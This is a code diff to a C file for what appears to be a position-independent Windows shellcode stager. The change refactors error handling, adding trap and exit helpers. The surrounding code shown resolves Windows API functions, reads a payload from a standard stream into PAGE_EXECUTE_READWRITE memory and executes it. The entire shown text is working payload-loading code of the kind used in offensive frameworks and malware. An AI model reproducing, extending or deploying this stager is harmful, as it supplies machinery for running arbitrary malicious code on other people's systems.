@@ -72,6 +72,17 @@ struct resolved_funcs {
 };
 
 PIC_TEXT
+__attribute__((noreturn)) static void fail_fast(void) { __builtin_trap(); }
+
+PIC_TEXT
+__attribute__((noreturn)) static void exit_process(
+	fn_ExitProcess pExitProcess, unsigned int uExitCode)
+{
+	pExitProcess(uExitCode);
+	fail_fast();
+}
+
+PIC_TEXT
 static int resolve_funcs(struct resolved_funcs *f)
 {
 	f->pGetStdHandle = (fn_GetStdHandle)pic_resolve(
@@ -112,9 +123,9 @@ void _start(void)
 	PIC_SELF_RELOCATE();
 
 	struct resolved_funcs f;
-	if (!resolve_funcs(&f))
-		for (;;)
-			;
+	if (!resolve_funcs(&f)) {
+		fail_fast();
+	}
 
 	extern char stager_fd_windows_config[]
 		__attribute__((visibility("hidden")));
@@ -123,22 +134,26 @@ void _start(void)
 		((pic_u32)cfg[2] << 16) | ((pic_u32)cfg[3] << 24);
 
 	void *h = f.pGetStdHandle(stream_handle_id(stream_id));
-	if (h == (void *)-1 || h == PIC_NULL)
-		f.pExitProcess(1);
+	if (h == (void *)-1 || h == PIC_NULL) {
+		exit_process(f.pExitProcess, 1);
+	}
 
 	pic_u32 size = read_payload_size(f.pReadFile, h);
-	if (size == 0 || size > 0x10000000)
-		f.pExitProcess(1);
+	if (size == 0 || size > 0x10000000) {
+		exit_process(f.pExitProcess, 1);
+	}
 
 	void *mem = f.pVirtualAlloc(PIC_NULL, (pic_uintptr)size,
 		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (!mem)
-		f.pExitProcess(1);
+	if (!mem) {
+		exit_process(f.pExitProcess, 1);
+	}
 
-	if (!read_all(f.pReadFile, h, mem, size))
-		f.pExitProcess(1);
+	if (!read_all(f.pReadFile, h, mem, size)) {
+		exit_process(f.pExitProcess, 1);
+	}
 
 	((void (*)(void))mem)();
 
-	f.pExitProcess(0);
+	exit_process(f.pExitProcess, 0);
 }
